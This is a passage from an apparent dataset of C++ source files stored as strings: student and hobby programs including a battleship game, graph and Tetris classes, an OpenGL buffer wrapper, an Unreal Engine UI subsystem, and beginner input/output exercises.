{\n    double num1, num2;\n    std::cout << \"Enter two numbers to divide: \";\n    std::cin >> num1 >> num2;\n    if (num2 != 0) {\n        std::cout << \"The quotient is: \" << num1 / num2 << std::endl;\n    } else {\n        std::cout << \"Error: Division by zero is not allowed.\" << std::endl;\n    }\n}\n",
    "#include <iostream>\n#include <string>\n#include <time.h>\n#include <Windows.h>\n#include <fstream>\n#include \"Plansza.h\"\n#include \"Gracz.h\"\n#include \"Komputer.h\"\n\nusing namespace std;\n\nvoid wypisz_dwie_plansze(Gracz plansza_gracz, Komputer plansza_komp) {\n\tsystem(\"cls\");\n\tplansza_gracz.wypisz_plansze();\n\tplansza_komp.wypisz_plansze();\n}\n\nvoid ruch_kompa(Gracz &plansza_gracz, Komputer &plansza_komp) {\n\tcout << \"\\nTeraz ruch wykonuje komputer.\" << endl;\n\twhile (plansza_gracz.strzel_komp()) {\n\t\twypisz_dwie_plansze(plansza_gracz, plansza_komp);\n\t\tif (plansza_komp.get_licznik() == 20) {\n\t\t\tcout << \"\\nWygrywasz!\";\n\t\t\texit(0);\n\t\t}\n\t\telse if (plansza_gracz.get_licznik() == 20) {\n\t\t\tcout << \"\\nWygrywa komputer.\";\n\t\t\texit(0);\n\t\t}\n\t}\n\tSleep(500);\n\tcout << \"\\nKoniec ruchu komputera.\" << endl;\n\tSleep(1500);\n}\n\nbool ruch_gracza(Gracz &plansza_gracz, Komputer &plansza_komp) {\n\tcout << \"\\nTwoj ruch.\";\n\twhile (plansza_komp.wykonaj_ruch()) {\n\t\twypisz_dwie_plansze(plansza_gracz, plansza_komp);\n\t\tSleep(500);\n\t\tif (plansza_komp.get_licznik() == 20) {\n\t\t\tcout << \"\\nWygrywasz!\";\n\t\t\treturn false;\n\t\t}\n\t\telse if (plansza_gracz.get_licznik() == 20) {\n\t\t\tcout << \"\\nWygrywa komputer.\";\n\t\t\treturn false ;\n\t\t}\n\t}\n\tcout << \"\\nKoniec Twojego ruchu.\" << endl;\n\tSleep(1500);\n\treturn true;\n}\n\nint main() {\n\tsrand ((unsigned int)time(NULL));\n\t// otworz plik do zapisu i do odczytu\n\tfstream plik;\n\tplik.open(\"zapis.txt\", ios::in | ios::app);\n\tGracz gracz;\n\tgracz.wpisz_nick();\n\tcout << \"Czesc, \" << gracz.get_nick() << \"! Zagramy w statki?\" << endl;\n\t// wybor - czy wczytac ostatnie wyniki\n\tcout << \"Czy chcesz zobaczyc wynik ostatnich rozgrywek?\" << endl;\n\tcout << \"Tak - wybierz 1.\" << endl;\n\tcout << \"Nie - wybierz inna liczbe.\" << endl;\n\tcout << \"Twoj wybor: \";\n\tint wybor = 0;\n\twhile (scanf_s(\"%d\", &wybor) != 1 || getchar() != '\\n') {\n\t\tcout << \"Bledne dane. Podaj jeszcze raz: \";\n\t\twhile (getchar() != '\\n') ; \n\t}\n\tif (wybor == 1) {\n\t\tif (plik.eof() || plik.is_open()) { // plik jest pusty\n\t\t\tcout << \"\\nPlik jest pusty.\";\n\t\t}\n\t\telse { // plik nie jest pusty\n\t\t\tchar linie[100];\n\t\t\twhile (plik.getline(linie, 100)) {\n\t\t\t\tcout << linie << endl;\n\t\t\t}\n\t\t\tsystem(\"pause\");\n\t\t}\n\t}\n\tGracz plansza_gracz;\n\tplansza_gracz.wypisz_plansze();\n\t// ustaw statki\n\tcout << \"\\nUstaw swoje statki na planszy.\" << endl;\n\tcout << \"Do ustawienia sa: 1 czteromasztowiec, 2 trzymasztowce, 3 dwumasztowce, 4 jednomasztowce\" << endl;\n\tplansza_gracz.ustaw_statki();\n\tKomputer plansza_komp;\n\tplansza_komp.losuj_statki();\n\tplansza_gracz.wypisz_plansze();\n\tplansza_komp.wypisz_plansze();\n\n\twhile (plansza_gracz.get_licznik() != 20 || plansza_komp.get_licznik() != 20) {\n\t\t// wypisanie dwoch plansz\n\t\twypisz_dwie_plansze(plansza_gracz, plansza_komp);\n\t\t// gracz strzela w plansze komputera\n\t\tif (!ruch_gracza(plansza_gracz, plansza_komp)) break;\n\t\t// koniec ruchu gracza\n\t\twypisz_dwie_plansze(plansza_gracz, plansza_komp);\n\t\t// komputer strzela w plansze gracza (losowo)\n\t\truch_kompa(plansza_gracz, plansza_komp);\n\t\t// koniec ruchu komputera\n\t\twypisz_dwie_plansze(plansza_gracz, plansza_komp);\n\t}\n\t// sprawdzenie, czy ktoras ze stron juz wygrala\n\tif (plansza_komp.get_licznik() == 20 ) plik << \"Rozgrywke wygral gracz \" << gracz.get_nick() << \".\\n\";\n\telse if (plansza_gracz.get_licznik() == 20) plik << \"Rozgrywke z graczem \" << gracz.get_nick() << \" wygral komputer.\\n\";\n\tplik.close();\n\treturn 0;\n}\n",
    "#include <algorithm>\n\n#include \"nav_input_memory.hpp\"\n\nnamespace nav::input::memory\n{\n\nstatic void close(void **userdata)\n{\n\tMemory **mem = (Memory**) userdata;\n\tdelete *mem;\n\t*mem = nullptr;\n}\n\nstatic size_t read(void *userdata, void *dest, size_t size)\n{\n\tMemory *mem = (Memory*) userdata;\n\tsize_t nextpos = mem->pos + size;\n\tsize_t readed;\n\n\tif (nextpos >= mem->size)\n\t{\n\t\treaded = size - (mem->size - nextpos);\n\t\tnextpos = mem->size;\n\t}\n\telse\n\t\treaded = size;\n\n\tif (readed > 0)\n\t{\n\t\tstd::copy(mem->data + mem->pos, mem->data + mem->pos + readed, (uint8_t*) dest);\n\t\tmem->pos = nextpos;\n\t}\n\n\treturn readed;\n}\n\nstatic nav_bool seek(void *userdata, uint64_t pos)\n{\n\tMemory *mem = (Memory*) userdata;\n\n\tif (pos >= mem->size)\n\t\tmem->pos = mem->size;\n\telse\n\t\tmem->pos = pos;\n\n\treturn true;\n}\n\nstatic uint64_t tell(void *userdata)\n{\n\tMemory *mem = (Memory*) userdata;\n\treturn (uint64_t) mem->pos;\n}\n\nstatic uint64_t fsize(void *userdata)\n{\n\tMemory *mem = (Memory*) userdata;\n\treturn (uint64_t) mem->size;\n}\n\nvoid populate(nav_input *input, void *buf, size_t size)\n{\n\tMemory *mem = new Memory();\n\tmem->data = (uint8_t*) buf;\n\tmem->pos = 0;\n\tmem->size = size;\n\n\tinput->userdata = mem;\n\tinput->close = close;\n\tinput->read = read;\n\tinput->seek = seek;\n\tinput->tell = tell;\n\tinput->size = fsize;\n}\n\n}\n",
    "#include \"graphList.h\"\r\n\r\n\r\ngraphList::graphList(){}\r\n/*\r\n    Konstruktor na potrzeby badan\r\n*/\r\n\r\ngraphList::graphList (int numVertices, float density, int seedHelper): numVertices_{numVertices}, density_{density}, seedHelper_{seedHelper}{\r\n    // obliczanie liczby krawedzi w grafie \r\n    int numEdges_ = ceil((density_ / 100) * (numVertices_ *(numVertices_ - 1)) / 2);\r\n\r\n    // dodawanie docelowej liczby wierzcholkow \r\n    for (int i =0; i < numVertices_; i ++){\r\n        insertVertex(new Vertex (i));\r\n    }\r\n\r\n    srand(seedHelper_ * 1000);\r\n\r\n    for (int i = 0; i < numEdges_ ; i++){\r\n        \r\n        Edge * edge = new Edge ( rand() % numVertices_,  rand() % numVertices_, rand() % 9 + 1 );\r\n        if (edge->vertex_id_1 == edge -> vertex_id_2){\r\n            i --; \r\n            continue;\r\n        }\r\n        else {\r\n            insertEdge(edge);\r\n        }\r\n    }\r\n\r\n}\r\n\r\n\r\n\r\n/*\r\n    ciala metod uaktualniajacych\r\n*/\r\n\r\nvoid graphList::insertVertex(Vertex* v)\r\n{\r\n    for(auto obj : v_vector)\r\n        if(obj->index_ == v->index_)\r\n            return;\r\n\r\n    v_vector.push_back(v);\r\n}\r\n\r\nvoid graphList::insertEdge(Edge * e){\r\n\r\n    // wyodrebnienie pol obiektu edge;\r\n    int id_1 = e ->vertex_id_1;\r\n    int id_2 = e -> vertex_id_2;\r\n    unsigned int weight = e -> weight_;\r\n\r\n    // e_vector.push_back(e);\r\n    for(auto vertex_1 : v_vector){\r\n        if(vertex_1 -> index_ == id_1){\r\n            for(auto vertex_2 : v_vector){\r\n                if(vertex_2 -> index_ == id_2){\r\n                    // std::cout << \"dodawanie krawedzi o wadze \" << weight << std::endl;\r\n\r\n                    // //sprawdzenie, czy podano indeksy do wiercholkow, ktore sa w grafie \r\n                    // if(id_1 >= numVertices_ || id_2 >= numVertices_){\r\n                    //     std::cout << \"Row or column out of range\\n\";\r\n                    // }\r\n\r\n                    \r\n                    e_vector.push_back(e);\r\n                    if(v_map.size() == 0){\r\n                        std::list<Vertex*> v1_list;\r\n                        v1_list.push_back(vertex_2);\r\n\r\n                        v_map.emplace(vertex_1, v1_list);\r\n\r\n                        std::list<Vertex *>v2_list;\r\n                        v2_list.push_back(vertex_1);\r\n\r\n                        v_map.emplace(vertex_2, v2_list);\r\n                        return;\r\n                    }\r\n\r\n                    if(v_map.find(vertex_1) != v_map.end()){\r\n                        v_map[vertex_1].push_back(vertex_2);\r\n                        v_map[vertex_2].push_back(vertex_1);\r\n                    }else{\r\n                        std::list<Vertex*> v1_list;\r\n                        v1_list.push_back(vertex_2);\r\n\r\n                        v_map.emplace(vertex_1, v1_list);\r\n\r\n                        std::list<Vertex*> v2_list;\r\n                        v2_list.push_back(vertex_1);\r\n\r\n                        v_map.emplace(vertex_2, v2_list);\r\n                    }\r\n                  \r\n                        return;\r\n                }\r\n            }\r\n        }\r\n    }\r\n}\r\n\r\nvoid graphList::removeVertex(Vertex* v)\r\n{\r\n    Vertex * temp;\r\n    for (auto it : v_map){\r\n        if (it.first ->index_ == v ->index_){\r\n            temp = it.first;\r\n            v_map.erase(temp);\r\n            break;\r\n        }\r\n    }\r\n\r\n    for(auto& pair : v_map){\r\n        pair.second.remove(temp);\r\n    }\r\n\r\n    for(int i = 0; i < v_vector.size(); i++){\r\n        if(v_vector[i] ->index_ == v ->index_){\r\n            v_vector.erase(v_vector.begin() + i);\r\n        }\r\n    }\r\n\r\n    delete temp;\r\n}\r\n\r\nvoid graphList::removeEdge(Edge* edge)\r\n{\r\n    Vertex* v1;\r\n    Vertex* v2;\r\n\r\n\r\n    // usun z mapy \r\n    for (auto obj : v_map){\r\n        if (obj.first ->index_ == edge -> vertex_id_1){\r\n            v1 = obj.first;\r\n        }\r\n        if (obj.first ->index_ == edge -> vertex_id_2){\r\n            v2 = obj.first;\r\n        }\r\n        \r\n\r\n\r\n    }\r\n    v_map.at(v1).remove(v2);\r\n    v_map.at(v2).remove(v1);\r\n\r\n    // znajdz w wektorze krawedzi i usun\r\n    int index =0;\r\n    for (auto it : e_vector){\r\n        if (!((it ->vertex_id_1 == edge -> vertex_id_2 && it ->vertex_id_2 == edge -> vertex_id_1)\r\n         || (it ->vertex_id_2 == edge -> vertex_id_2 && it ->vertex_id_1 == edge -> vertex_id_1))){\r\n            index ++;\r\n         }\r\n         else {\r\n            e_vector.erase(e_vector.begin() + index);\r\n         }\r\n    }   \r\n    delete edge;\r\n}\r\n\r\n/*\r\n    ciala metod iterujacych\r\n*/\r\n\r\nstd::vector<Edge*> graphList::incidentEdges(Vertex* v)\r\n{\r\n    std::vector<Edge*> temp;\r\n\r\n    \r\n            \r\n    for(auto obj : e_vector)\r\n        if((obj->vertex_id_1 == v -> index_) || obj -> vertex_id_2 == v -> index_){\r\n            temp.push_back(obj);\r\n\r\n        }\r\n\r\n\r\n    return temp;\r\n}\r\n\r\nstd::vector<Edge*> graphList::edges()\r\n{\r\n    return e_vector;\r\n}\r\n\r\nstd::vector<Vertex*> graphList::vertices()\r\n{\r\n    return v_vector;\r\n}\r\n\r\n/*\r\n    Ciala metod dostepu\r\n*/\r\n\r\nstd::vector<Vertex*> graphList::endVertices(Edge* edge)\r\n{\r\n    // wektor do ost",
    "#include <iostream>\r\n#include <algorithm>\r\n#include <string>\r\n\r\nusing namespace std;\r\n\r\n// Fungsi binary search untuk mencari huruf dalam string\r\nint binarySearch(const string &str, char target) {\r\n    int left = 0;\r\n    int right = str.length() - 1;\r\n\r\n    while (left <= right) {\r\n        int mid = left + (right - left) / 2;\r\n\r\n        if (str[mid] == target) {\r\n            return mid; // huruf ditemukan\r\n        } else if (str[mid] < target) {\r\n            left = mid + 1;\r\n        } else {\r\n            right = mid - 1;\r\n        }\r\n    }\r\n\r\n    return -1; // huruf tidak ditemukan\r\n}\r\n\r\nint main() {\r\n    string kalimat;\r\n    char huruf;\r\n\r\n    // Input kalimat\r\n    cout << \"Masukkan kalimat: \";\r\n    getline(cin, kalimat);\r\n\r\n    // Input huruf yang dicari\r\n    cout << \"Masukkan huruf yang ingin dicari: \";\r\n    cin >> huruf;\r\n\r\n    // Melakukan binary search pada kalimat\r\n    int posisi = binarySearch(kalimat, huruf);\r\n\r\n    // Mengecek apakah huruf ditemukan atau tidak\r\n    if (posisi != -1) {\r\n        cout << \"Huruf \\\"\" << huruf << \"\\\" ditemukan pada posisi \" << posisi + 1 << \" dari kalimat.\" << endl;\r\n    } else {\r\n        cout << \"Huruf \\\"\" << huruf << \"\\\" tidak ditemukan dalam kalimat.\" << endl;\r\n    }\r\n\r\n    return 0;\r\n}",
    "#include \"Block.h\"\n#include <time.h>\n#include <stdlib.h>\n\n\nIMAGE* Block::imgs[7] = { NULL, };\nint Block::size = 36;\nBlock::Block()\n{\n\n\tif (imgs[0] == NULL)\n\t{\n\t\tIMAGE tempImg;\n\t\tloadimage(&tempImg, \"./images/tiles.png\");\n\t\t//\u5c06\u5de5\u4f5c\u533a\u8bbe\u7f6e\u5728\u4e34\u65f6\u56fe\u7247\u4e0a\n\t\tSetWorkingImage(&tempImg);\n\t\tfor (int i = 0; i < 7; i++)\n\t\t{\n\t\t\timgs[i] = new IMAGE;\n\t\t\tgetimage(imgs[i], i * size, 0,size, size);\t//\u5207\u51fa\u7684\u65b9\u5757\u5927\u5c0f\u4e3asize\n\t\t}\n\t\tSetWorkingImage();\t//\u6062\u590d\u5de5\u4f5c\u533a\n\t\tsrand(time(NULL));\t\n\t}\n\n\n\t//\u76f8\u5bf9\u5750\u6807\u8868\u793a\u6cd5,\u539f\u7406\u53c2\u89c1image\u6587\u4ef6\u5939\u4e0b\u7684\u76f8\u5bf9\u5750\u6807\u8868\u793a\u6cd5.jpg\n\tint blocks[7][4] = {\n\t 1,3,5,7, // \u957f\u6761\n\t 2,4,5,7, // Z 1\u578b\n\t 3,5,4,6, // Z 2\u578b\n\t 3,5,4,7, // \u5c0fT\n\t 2,3,5,7, // \u5de6\u624b\u6298\u89d2\n\t 3,5,7,6, // \u53f3\u624b\u6298\u89d2\n\t 2,3,4,5, // \u6124\u6012\u7537\u5b69\n\t};\n\n\t//\u968f\u673a\u751f\u6210\u4e00\u79cd\u4fc4\u7f57\u65af\u65b9\u5757\n\tblockType =1+rand() % 7;\t//\u7c7b\u578b\u4ece1\u52307\u6765\u547d\u540d\n\n\t//\u521d\u59cb\u5316smallBlock\n\tfor (int i = 0; i < 4; i++)\n\t{\n\t\tint value = blocks[blockType-1][i];\n\t\tsmallBlocks[i].row = value / 2;\n\t\tsmallBlocks[i].column = value % 2;\n\t}\n\n\timg = imgs[blockType - 1];\t//\u7ed8\u5236\u7684\u65b9\u5757\u5bf9\u5e94\u7684\u56fe\u7247\u53c2\u6570\n}\n\nint Block::getBlockType()\n{\n\n\treturn 0;\n}\n\nBlock::~Block()\n{\n}\n\nvoid Block::drop()\n{\n\t//\u4e0b\u964d\u5c31\u662f\u884c\u6807\u52a0\u52a0\n\tfor (auto &block:smallBlocks)\n\t\tblock.row++;\n}\n\nvoid Block::moveLeftRight(int offset)\n{\n\tfor (int i = 0; i < 4; i++)\n\t\tsmallBlocks[i].column += offset;\n}\n\n\n//\u65cb\u8f6c\u51fd\u6570\u516c\u5f0f\u786e\u5b9e\u5f88\u590d\u6742\uff0c\u6211\u5728\u8003\u8651\u8981\u4e0d\u8981\u5199\u4e86\u62cd\u5f20\u7167\u5f04\u4e0a\u53bb\nvoid Block::rotate()\n{\n\t//\u628a\u7b2c\u4e8c\u4e2a\u70b9\u4f5c\u4e3a\u4e2d\u5fc3\n\tPoint p = smallBlocks[1];\n\tfor (int i = 0; i < 4; i++)\n\t{\n\t\tPoint temp = smallBlocks[i];\n\t\tsmallBlocks[i].column = p.column - temp.row + p.row;\n\t\tsmallBlocks[i].row = p.row + temp.column - p.column;\n\t}\n\n}\n\nvoid Block::draw(int leftMargin, int topMargin)\n{\n\tfor (int i = 0; i < 4; i++)\n\t{\n\t\t//\u8fd9\u91cc\u76f4\u63a5\u7528\u903b\u8f91\u5750\u6807\u4e58\u4ee5\u5c0f\u65b9\u5757\u5927\u5c0f\u52a0\u4e0a\u548c\u56db\u5468\u7684\u8ddd\u79bb\u6765\u8ba1\u7b97\u50cf\u7d20\u5750\u6807\n\t\tint x = leftMargin + smallBlocks[i].column * size;\n\t\tint y = topMargin + smallBlocks[i].row * size;\n\t\tputimage(x, y, img);\n\t}\n}\n\nIMAGE** Block::getImages()\n{\n\treturn imgs;\n}\n\nbool Block::blockInMap(const vector<vector<int>>& map)\n{\n\t//\u65b9\u5757\u8d85\u51fa\u524d\u540e\u5de6\u53f3\u8fb9\u754c\uff0c\u6216\u8005\u8be5\u5904\u6709\u65b9\u5757\u90fd\u8868\u793a\u8fd9\u4e2a\u4e0d\u662f\u5408\u6cd5\u4f4d\u7f6e\n\tfor (int i = 0; i < 4; i++)\n\t{\n\t\tint rows = map.size();\n\t\tint cols = map[0].size();\n\t\tif (smallBlocks[i].column<0 || smallBlocks[i].column>=cols\n\t\t\t|| smallBlocks[i].row<0 || smallBlocks[i].row>=rows\n\t\t\t|| map[smallBlocks[i].row][smallBlocks[i].column] != 0)\n\t\t\treturn false;\n\n\t}\n\treturn true;\n}\n\nBlock& Block::operator=(const Block& other)\n{\n\tif (this == &other)\n\t\treturn *this;\n\t\n\tthis->blockType = other.blockType;\n\t\n\tfor (int i = 0; i < 4; i++)\n\t\tthis->smallBlocks[i] = other.smallBlocks[i];\n\treturn *this;\n}\n\nvoid Block::solidify(vector<vector<int>>& map)\n{\n\t//\u6539\u5199\u5730\u56fe\u6807\u8bb0\n\tfor (int i = 0; i < 4; i++)\n\t\tmap[smallBlocks[i].row][smallBlocks[i].column] = blockType;\n\n}\n",
    "#include \"gVertexArray.h\"\n\n// #include \"gRender.h\"\n#include \"gl.h\"\n\nnamespace grr {\n    gVertexArray::gVertexArray() : m_bufferSize(0), m_vao(-1) {}\n\n    gVertexArray* gVertexArray::m_instance = nullptr;\n\n    std::unordered_map<BufferType, u32> gVertexArray::m_bufferTypeMap {\n        {BufferType_VBO, GL_ARRAY_BUFFER},\n        {BufferType_DEFAULT, GL_ARRAY_BUFFER},\n        {BufferType_EBO, GL_ELEMENT_ARRAY_BUFFER}\n    };\n\n    std::unordered_map<PrimitiveType, u32> gVertexArray::m_primitiveMap {\n        {PrimitiveType_Points, GL_POINTS},\n        {PrimitiveType_Lines, GL_LINES},\n        {PrimitiveType_LineLoop, GL_LINE_LOOP},\n        {PrimitiveType_LineStrip, GL_LINE_STRIP},\n        {PrimitiveType_Triangles, GL_TRIANGLES},\n        {PrimitiveType_TriangleStrip, GL_TRIANGLE_STRIP},\n        {PrimitiveType_TriangleFan, GL_TRIANGLE_FAN}\n    };\n\n    std::unordered_map<u32, u32> gVertexArray::m_bufferIndex;\n\n    gVertexArray *gVertexArray::Create(u32 bufferSize, u16 stride, bool hasElements) {\n        gVertexArray* vertexArray = new gVertexArray();\n        vertexArray->m_bufferSize = bufferSize;\n\n        GL_CALL(glGenVertexArrays(1, &vertexArray->m_vao));\n\n        return vertexArray;\n    }\n\n    u32 gVertexArray::CreateBuffer(BufferType target, u32 size, u16 stride) {\n        u32 m_index = 0;\n        GL_CALL(glGenBuffers(1, &m_index));\n\n        GL_CALL(glBindBuffer(m_bufferTypeMap[target], m_index));\n        GL_CALL(glBufferData(m_bufferTypeMap[target], size * stride, nullptr, GL_STATIC_DRAW));\n\n        GL_CALL(glBindBuffer(m_bufferTypeMap[target], 0));\n\n        m_bufferIndex.emplace(m_index, m_bufferTypeMap[target]);\n\n        return m_index;\n    }\n\n    void gVertexArray::Bind(u32 index) {\n        GL_CALL(glBindBuffer(m_bufferIndex[index], index));\n    }\n\n    void gVertexArray::SetAttrib(u8 index, u16 size, u16 stride, const void *pointer) {\n        GL_CALL(glVertexAttribPointer(static_cast<GLuint>(index), static_cast<GLint>(size), GL_FLOAT, GL_FALSE, static_cast<GLsizei>(stride), pointer));\n        GL_CALL(glEnableVertexAttribArray(static_cast<GLuint>(index)));\n    }\n\n    void gVertexArray::UpdateResize(u32 index, u32 size, u16 stride) {\n        int arraySize = 0;\n        GL_CALL(glGetBufferParameteriv(m_bufferIndex[index], GL_BUFFER_SIZE,  &arraySize));\n        \n        while ((size * stride) > arraySize) {\n            GL_CALL(glBufferData(m_bufferIndex[index], (arraySize + (GR_MAX_BLOCK_BUFFER * stride)), nullptr, GL_STATIC_DRAW));\n\n            GL_CALL(glGetBufferParameteriv(m_bufferIndex[index], GL_BUFFER_SIZE,  &arraySize));\n        }\n    }\n\n    void gVertexArray::SetBufferUpdate(u32 index, u32 offset, u32 size, const void *data) {\n        GL_CALL(glBufferSubData(m_bufferIndex[index], offset, size, data));\n    }\n\n    void gVertexArray::DrawElementsInstanced(PrimitiveType primitive, u32 count, const void *indices, u32 primcount) {\n        GL_CALL(glDrawElementsInstanced(m_primitiveMap[primitive], count, GL_UNSIGNED_INT, indices, primcount));\n    }\n\n    void gVertexArray::DrawElements(PrimitiveType primitive, u32 count, const void* indices) {\n        GL_CALL(glDrawElements(m_primitiveMap[primitive], count, GL_UNSIGNED_INT, indices));\n    }\n\n    void gVertexArray::DrawArrays(PrimitiveType primitive, u32 count) {\n        GL_CALL(glDrawArrays(m_primitiveMap[primitive], 0, count));\n    }\n\n    void gVertexArray::bind() {\n        GL_CALL(glBindVertexArray(m_vao));\n\n        m_instance = this;\n    }\n\n    void gVertexArray::unbind() {\n        glBindVertexArray(0);\n\n        m_instance = nullptr;\n    }\n\n    void gVertexArray::destroy() {\n        if (m_vao != -1) {\n            GL_CALL(glDeleteVertexArrays(1, &m_vao));\n        }\n        delete this;\n    }\n} // namespace grr\n\n\n\n",
    "\ufeff// \u00a9 2024 Marco Silva. All Rights Reserved.\r\n\r\n\r\n#include \"UserInterfaceSubsystem.h\"\r\n#include \"UserWidgets/BaseGameDisplay.h\"\r\n#include \"UserWidgets/BaseMenu.h\"\r\n#include \"Blueprint/WidgetBlueprintLibrary.h\"\r\n\r\nvoid UUserInterfaceSubsystem::Initialize(FSubsystemCollectionBase& Collection)\r\n{\r\n\tSuper::Initialize(Collection);\r\n\r\n}\r\n\r\nvoid UUserInterfaceSubsystem::Deinitialize()\r\n{\r\n\tSuper::Deinitialize();\r\n\r\n\tfor (auto GameDisplay : GameDisplays)\r\n\t{\r\n\t\tif (GameDisplay)\r\n\t\t\tGameDisplay->RemoveFromParent();\r\n\t}\r\n}\r\n\r\nbool UUserInterfaceSubsystem::PushGameDisplay(UBaseGameDisplay*& OutGameDisplay, TSubclassOf<UBaseGameDisplay> GameDisplayClass,\r\n\tint32 Layer, int32 ZOrder, bool bPlayerDisplay, bool bImmediate)\r\n{\r\n\tAPlayerController* LocalPlayer = GetLocalPlayer()->PlayerController;\r\n\tOutGameDisplay = CreateWidget<UBaseGameDisplay>(LocalPlayer, GameDisplayClass);\r\n\r\n\tif (!OutGameDisplay) return false;\r\n\r\n\tif (bPlayerDisplay) OutGameDisplay->AddToPlayerScreen(ZOrder);\r\n\telse OutGameDisplay->AddToViewport(ZOrder);\r\n\r\n\tOutGameDisplay->SetLayer(Layer);\r\n\tGameDisplays.Add(OutGameDisplay);\r\n\r\n\tif (bImmediate) ShowGameDisplay(OutGameDisplay, false);\r\n\telse HideGameDisplay(OutGameDisplay);\r\n\r\n\treturn true;\r\n}\r\n\r\nbool UUserInterfaceSubsystem::RemoveGameDisplay(UBaseGameDisplay* GameDisplay)\r\n{\r\n\tif (GameDisplays.Contains(GameDisplay))\r\n\t{\r\n\t\tGameDisplays.Remove(GameDisplay);\r\n\r\n\t\tHideGameDisplay(GameDisplay);\r\n\t\tGameDisplay->RemoveFromParent();\r\n\t\treturn true;\r\n\t}\r\n\treturn false;\r\n}\r\n\r\nbool UUserInterfaceSubsystem::ShowGameDisplay(UBaseGameDisplay* GameDisplay, bool bForce)\r\n{\r\n\tif (GameDisplay)\r\n\t{\r\n\t\tif (!CollapsedLayers.Contains(GameDisplay->GetLayer()) || bForce)\r\n\t\t{\r\n\t\t\tGameDisplay->SetVisibility(ESlateVisibility::HitTestInvisible);\r\n\t\t\treturn true;\r\n\t\t}\r\n\t}\r\n\treturn false;\r\n}\r\n\r\nbool UUserInterfaceSubsystem::HideGameDisplay(UBaseGameDisplay* GameDisplay)\r\n{\r\n\tif (GameDisplay)\r\n\t{\r\n\t\tGameDisplay->SetVisibility(ESlateVisibility::Collapsed);\r\n\t\treturn true;\r\n\t}\r\n\treturn false;\r\n}\r\n\r\nvoid UUserInterfaceSubsystem::CollapseLayer(int32 Layer)\r\n{\r\n\tif (!CollapsedLayers.Contains(Layer))\r\n\t{\r\n\t\tCollapsedLayers.Add(Layer);\r\n\t\tfor (auto GameDisplay : GameDisplays)\r\n\t\t{\r\n\t\t\tif (GameDisplay->GetLayer() == Layer)\r\n\t\t\t{\r\n\t\t\t\tHideGameDisplay(GameDisplay);\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n}\r\n\r\nvoid UUserInterfaceSubsystem::DisplayLayer(int32 Layer)\r\n{\r\n\tif (CollapsedLayers.Contains(Layer))\r\n\t{\r\n\t\tCollapsedLayers.Remove(Layer);\r\n\t\tfor (auto GameDisplay : GameDisplays)\r\n\t\t{\r\n\t\t\tif (GameDisplay->GetLayer() == Layer)\r\n\t\t\t{\r\n\t\t\t\tShowGameDisplay(GameDisplay);\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n}\r\n\r\nbool UUserInterfaceSubsystem::PushMenu(UBaseMenu*& OutMenu, TSubclassOf<UBaseMenu> MenuClass, bool bPlayerDisplay, bool bImmediate)\r\n{\r\n\tAPlayerController* LocalPlayer = GetLocalPlayer()->PlayerController;\r\n\tOutMenu = CreateWidget<UBaseMenu>(LocalPlayer, MenuClass);\r\n\r\n\tif (!OutMenu) return false;\r\n\r\n\tif (bPlayerDisplay) OutMenu->AddToPlayerScreen();\r\n\telse OutMenu->AddToViewport();\r\n\r\n\tHideMenu(OutMenu, true);\r\n\tif (bImmediate) ShowMenu(OutMenu, false);\r\n\r\n\treturn true;\r\n}\r\n\r\nbool UUserInterfaceSubsystem::RemoveMenu(UBaseMenu* Menu)\r\n{\r\n\tif (Menus.Contains(Menu))\r\n\t{\r\n\t\tMenus.Remove(Menu);\r\n\r\n\t\tHideMenu(Menu, true);\r\n\t\tMenu->RemoveFromParent();\r\n\t\treturn true;\r\n\t}\r\n\treturn false;\r\n}\r\n\r\nbool UUserInterfaceSubsystem::ShowMenu(UBaseMenu* Menu, bool bForce)\r\n{\r\n\tif (Menu)\r\n\t{\r\n\t\tif (CurrentMenu == nullptr || bForce)\r\n\t\t{\r\n\t\t\tAPlayerController* LocalPlayer = GetLocalPlayer()->PlayerController;\r\n\r\n\t\t\tHideMenu(CurrentMenu, true);\r\n\t\t\tMenu->SetVisibility(ESlateVisibility::Visible);\r\n\t\t\tMenu->NativeOnShow();\r\n\t\t\tCurrentMenu = Menu;\r\n\r\n\t\t\tUWidgetBlueprintLibrary::SetInputMode_UIOnlyEx(LocalPlayer, CurrentMenu, EMouseLockMode::DoNotLock);\r\n\t\t\tLocalPlayer->bShowMouseCursor = true;\r\n\r\n\t\t\treturn true;\r\n\t\t}\r\n\t}\r\n\treturn false;\r\n}\r\n\r\nbool UUserInterfaceSubsystem::HideMenu(UBaseMenu* Menu, bool bForce)\r\n{\r\n\tif (Menu && (Menu == CurrentMenu || bForce))\r\n\t{\r\n\t\tAPlayerController* LocalPlayer = GetLocalPlayer()->PlayerController;\r\n\r\n\t\tCurrentMenu = nullptr;\r\n\t\tMenu->SetVisibility(ESlateVisibility::Collapsed);\r\n\t\tMenu->NativeOnHide();\r\n\r\n\t\tUWidgetBlueprintLibrary::SetInputMode_GameOnly(LocalPlayer);\r\n\t\tLocalPlayer->bShowMouseCursor = false;\r\n\r\n\t\treturn true;\r\n\t}\r\n\treturn false;\r\n}\r\n",
    "#include <iostream>\nusing namespace std;\nint main() {\n    char name[20] = \"Ivan\";\n    int age = 16;\n\n    cout << \"Name: \" << name << endl;   //cout\n    cout << \"Age: \" << age << endl;     //endl\n\n\n\n\n    const int number_1 = 2;\n    int number_2 = 4;\n\n    cout << \"\\nNumber 1: \" << number_1 << \"\\nNumber 2: \" << number_2 << endl;\n\n\n\n\n    float floatNumber = 2.1435;\n    double doubleNumber_1 = 2.1436;\n    double doubleNumber_2 = 2.14e+013;      // doubleNumber_2 = 2.14*10^13 = 21400000000000\n    double doubleNumber_3 = -2.14e-013;     // doubleNumber_3 = -2.14*10^-13 = -0.000000000000214\n\n    cout << '\\n' << floatNumber << '\\n' << doubleNumber_1 << '\\n' << doubleNumber_2 << '\\n' << doubleNumber_3 << endl;\n\n\n\n\n    char symbol = 'A';\n    bool flag = true;       //Logic operator true = 1; false = 0;\n    const char NewLine = '\\n';\n\n    cout << NewLine << symbol << NewLine << flag << endl;\n\n\n\n\n    int number;\n    cout << \"\\nEnter number: \";\n    cin >> number;\n\n    cout << \"Your number: \" << number << endl;\n}",
